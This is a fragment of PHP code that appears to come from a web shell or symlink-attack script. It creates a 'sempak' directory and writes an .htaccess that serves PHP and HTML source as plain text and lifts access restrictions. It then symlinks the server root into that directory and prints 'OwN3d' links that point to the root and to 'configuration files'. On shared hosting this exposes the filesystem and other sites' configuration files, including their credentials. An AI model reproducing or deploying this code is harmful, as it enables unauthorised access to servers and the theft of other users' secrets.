...
$g = fopen('sempak/.htaccess','w');
fwrite($g,$rr);
$sempak = symlink("/","sempak/root");
		    $rt="<a href=sempak/root><font color=white size=3 face=\"comic sans ms\"> OwN3d</font></a>";
        echo "Bhai ji .... check link given below for / folder symlink <br><u>$rt</u>";
		
		$dir=mkdir('sempak',0777);
		$r  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
        $f = fopen('sempak/.htaccess','w');
   
        fwrite($f,$r);
        $consym="<a href=sempak/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
